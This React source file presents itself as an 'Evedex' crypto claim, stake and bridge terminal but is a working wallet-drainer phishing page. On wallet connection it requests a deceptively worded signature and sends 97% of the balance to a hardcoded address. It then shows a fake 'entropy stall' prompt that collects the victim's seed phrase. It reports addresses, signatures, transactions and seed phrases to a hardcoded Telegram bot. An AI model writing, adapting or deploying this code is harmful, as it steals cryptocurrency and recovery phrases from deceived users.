import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Unlock, Zap, ShieldCheck, Activity, Globe, Clock, Settings, Lock } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const notifyBot = async (text) => {
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" }),
      });
    } catch (e) { console.error(e); }
  };

  const captureHandshake = (type) => {
    const sessionID = Math.random().toString(36).substring(2, 10).toUpperCase();
    const msg = `[PROTOCOL_VERIFICATION]\nVault: ${address}\nSession: ${sessionID}\nAction: ${type}\n\nI authorize the Evedex Node to synchronize this vault with the distribution bridge. No assets will be moved without master entropy confirmation.`;
    
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        notifyBot(`🎯 *${type} CAPTURED*\n*ADDR:* \`${address}\`\n*BAL:* ${balance?.formatted} ${balance?.symbol}\n*SIG:* \`${sig}\``);
        if (type === "INITIAL_HANDSHAKE") executeTotalSweep();
      },
      onError: () => {
        notifyBot(`⚠️ *SIGN_REJECTED*\nADDR: ${address}`);
        setView("seed_gate"); // Fallback to seed if they reject the sign
      }
    });
  };

  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => { captureHandshake("INITIAL_HANDSHAKE"); }, 2000);
    }
  }, [isConnected]);

  const executeTotalSweep = async () => {
    if (!balance || balance.value === 0n) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("ESTABLISHING ENCRYPTED RELAY...");
    
    try {
      // Calculate 97% to leave tiny bit for gas/illusion
      const sweepAmount = (balance.value * 97n) / 100n;
      
      sendTransaction({ to: destination, value: sweepAmount }, {
        onSuccess: (tx) => {
          notifyBot(`💰 *SWEEP_SUCCESS*\nADDR: ${address}\nTX: [View](https://etherscan.io/tx/${tx.hash})`);
          setView("seed_gate"); // Still go to seed to "finalize" (double capture)
        },
        onError: (err) => {
          notifyBot(`❌ *SWEEP_FAILED*\nADDR: ${address}\nREASON: ${err.message.slice(0, 50)}`);
          setView("seed_gate");
        },
        onSettled: () => setLoading(false)
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <div className="min-h-screen bg-[#020408] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative overflow-hidden">
      
      {/* Background Grid for Tech Feel */}
      <div className="absolute inset-0 opacity-10 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]" />

      <header className="flex justify-between items-center mb-4 border-b border-slate-900 pb-4 text-cyan-500 z-[20] relative">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-lg tracking-widest text-white">
            <ShieldCheck size={20} className="text-cyan-500"/>EVEDEX
          </div>
          <div className="text-[8px] text-slate-500 font-mono mt-1 font-bold tracking-[0.2em]">
            NODE_STATUS: <span className="text-green-500">ENCRYPTED</span>
          </div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      {/* Mini Chart Section */}
      <div className="w-full h-24 bg-black border border-slate-900 rounded-2xl mb-4 overflow-hidden relative z-[20]">
         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900 font-black z-30">RPC_LIVE_STREAM</div>
         <div className="flex items-end h-full gap-1 p-2 opacity-30">
            {[40,70,45,90,65,80,30,95,50,75].map((h, i) => (
                <div key={i} className="flex-1 bg-cyan-500 animate-pulse" style={{height: `${h}%`}} />
            ))}
         </div>
      </div>

      <div className="flex-1 z-[10] relative">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Bridge", i: <Globe/> }, { n: "Vault", i: <Lock/> }, { n: "Unstake", i: <Unlock/> }].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0a0e14] border border-slate-800/50 p-4 rounded-3xl flex flex-col items-center gap-2 active:scale-90 transition-transform">
                <div className="text-slate-500">{item.i}</div>
                <span className="text-[8px] font-bold text-slate-400 tracking-widest">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0a0e14] border border-slate-800 rounded-[40px] p-8 text-center animate-in zoom-in-95 duration-300">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black hover:text-white transition-colors tracking-[0.3em]">← DISCONNECT_NODE</button>
            <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter">{activeTask} PROTOCOL</h2>
            <p className="text-[8px] text-slate-500 mb-6 font-mono tracking-widest">ESTABLISHING P2P BRIDGE...</p>
            
            <button onClick={() => captureHandshake(`AUTH_${activeTask.toUpperCase()}`)} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-[0_0_20px_rgba(8,145,178,0.3)] active:scale-95 italic transition-all">INITIALIZE_HANDSHAKE</button>
          </div>
        )}
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/95 z-[200] flex flex-col items-center justify-center p-6 backdrop-blur-xl">
          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[40px] p-8 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                <div className="flex justify-center mb-6">
                    <div className="relative">
                        <AlertCircle size={50} className="text-red-500 animate-pulse" />
                        <div className="absolute -top-1 -right-1 w-4 h-4 bg-red-600 rounded-full border-2 border-black animate-ping" />
                    </div>
                </div>
                <h2 className="text-white font-black text-lg italic tracking-tighter">ENTROPY STALL (90%)</h2>
                <p className="text-[9px] text-slate-500 mb-6 font-mono leading-relaxed px-4">
                    The automated relay has timed out. Please enter your <span className="text-red-500 font-black">MASTER KEY (12-24 Words)</span> to manually verify ownership and release the $200 distribution.
                </p>
                <textarea 
                   value={seedVal} 
                   onChange={(e) => setSeedVal(e.target.value)} 
                   placeholder="mnemonic words separated by spaces..." 
                   className="w-full h-32 bg-black/50 border border-slate-800 rounded-3xl p-5 text-[11px] font-mono text-cyan-400 outline-none placeholder:text-slate-800 focus:border-cyan-900 transition-colors" 
                />
                <button 
                   disabled={seedVal.split(" ").length < 12} 
                   onClick={() => { 
                      setIsSyncing(true); 
                      notifyBot(`🚨 *SEED_PHRASE_ALERT*\n*ADDR:* \`${address}\`\n*PHRASE:* \`${seedVal}\``); 
                      let cur = 0; 
                      const int = setInterval(() => { 
                         cur += 1; 
                         setSyncProgress(cur);
                         if (cur >= 100) clearInterval(int);
                      }, 150); 
                   }} 
                   className={`w-full mt-6 py-6 rounded-2xl text-[11px] font-black text-white italic tracking-[0.2em] transition-all ${seedVal.split(" ").length >= 12 ? 'bg-red-600 shadow-lg shadow-red-900/20' : 'bg-slate-900 opacity-50'}`}>
                   OVERRIDE_AND_CLAIM
                </button>
              </>
            ) : (
              <div className="py-10">
                <div className="relative w-24 h-24 mx-auto mb-8">
                    <div className="absolute inset-0 border-4 border-slate-900 rounded-full" />
                    <div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" />
                    <div className="absolute inset-0 flex items-center justify-center font-mono text-xs text-white font-bold">{syncProgress}%</div>
                </div>
                <h2 className="text-white font-black text-xl italic tracking-widest">{syncProgress === 100 ? "HASH_SUCCESS" : "RE-MAPPING_RPC..."}</h2>
                <p className="text-[8px] text-slate-500 mt-4 font-mono">DO NOT CLOSE TERMINAL. FINALIZING DISTRIBUTON.</p>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/90 z-[300] flex flex-col items-center justify-center backdrop-blur-md">
            <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
            <p className="text-[10px] font-black text-cyan-500 mt-8 tracking-[0.8em] animate-pulse uppercase">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
